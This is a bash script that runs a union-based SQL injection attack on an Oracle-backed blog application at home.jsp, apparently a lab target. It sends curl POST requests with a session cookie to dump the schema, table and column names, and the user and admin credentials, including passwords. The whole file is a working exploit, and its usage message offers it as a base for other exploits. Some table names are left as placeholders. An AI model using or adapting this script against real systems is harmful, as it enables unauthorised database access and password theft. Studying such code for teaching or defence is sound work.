#!/bin/bash
#query="' union select NULL,(SELECT table_name FROM all_tables OFFSET 10 ROWS FETCH NEXT 1 ROWS ONLY),NULL from dual--"

if [ "$#" -ne 1 ]; then
	echo "Usage ./exploit_sqli.sh <cookie> (It can be the base for other exploits)"
	exit
fi

#Dumping schema
query="' union select NULL,(SELECT owner FROM all_tables OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),NULL from dual--"
echo "[+] DUMPING SCHEMA"
cookie=$1
curl -X POST -d "author=$query" -s http://10.11.1.222:8080/blog/home.jsp --cookie $cookie | awk -F "null with title" '{print $2}' | awk -F "from" 'NF > 1 {print "	[*] Schema --> " $1}'

#Dumping tables
echo "[+] DUMPING INTERESTING TABLES"
cookie=$1
for i in $(seq 68 70);
do
	query="' union select NULL,(SELECT table_name FROM all_tables OFFSET $i ROWS FETCH NEXT 1 ROWS ONLY),NULL from dual--"
	curl -X POST -d "author=$query" -s http://10.11.1.222:8080/blog/home.jsp --cookie $cookie | awk -F "null with title" '{print $2}' | awk -F "from" 'NF > 1 {print "	[*] Table --> " $1}'
done

#Dumping columns [FILL_HERE]
echo "[+] DUMPING [FILL_HERE] TABLE COLUMNS"
cookie=$1
for i in $(seq 0 2);
do
	query="' union select NULL,(SELECT column_name FROM all_tab_columns WHERE table_name = '[FILL_HERE]' OFFSET $i ROWS FETCH NEXT 1 ROWS ONLY),NULL from dual--"
	curl -X POST -d "author=$query" -s http://10.11.1.222:8080/blog/home.jsp --cookie $cookie | awk -F "null with title" '{print $2}' | awk -F "from" 'NF > 1 {print "	[*] Column --> " $1}'
done

#Dumping [FILL_HERE]
echo "[+] DUMPING [FILL_HERE] TABLE"
cookie=$1
for i in $(seq 0 2);
do
	query="' union select NULL,(SELECT TO_CHAR(USER_ID) || ':' || TO_CHAR(USER_NAME) || ':' || TO_CHAR(PASSWORD) FROM [FILL_HERE] OFFSET $i ROWS FETCH NEXT 1 ROWS ONLY),NULL from dual--"
	curl -X POST -d "author=$query" -s http://10.11.1.222:8080/blog/home.jsp --cookie $cookie | awk -F "null with title" '{print $2}' | awk -F "from" 'NF > 1 {print "	[*] Row --> " $1}'
done

#Dumping columns [FILL_HERE]
echo "[+] DUMPING [FILL_HERE] TABLE COLUMNS"
cookie=$1
for i in $(seq 0 2);
do
	query="' union select NULL,(SELECT column_name FROM all_tab_columns WHERE table_name = '[FILL_HERE]' OFFSET $i ROWS FETCH NEXT 1 ROWS ONLY),NULL from dual--"
	curl -X POST -d "author=$query" -s http://10.11.1.222:8080/blog/home.jsp --cookie $cookie | awk -F "null with title" '{print $2}' | awk -F "from" 'NF > 1 {print "	[*] Column --> " $1}'
done

#Dumping [FILL_HERE]
echo "[+] DUMPING [FILL_HERE] TABLE"
cookie=$1
query="' union select NULL,(SELECT TO_CHAR(ADMIN_ID) || ':' || TO_CHAR(ADMIN_NAME) || ':' || TO_CHAR(PASSWORD) FROM [FILL_HERE] OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),NULL from dual--"
curl -X POST -d "author=$query" -s http://10.11.1.222:8080/blog/home.jsp --cookie $cookie | awk -F "null with title" '{print $2}' | awk -F "from" 'NF > 1 {print "	[*] Column --> " $1}'

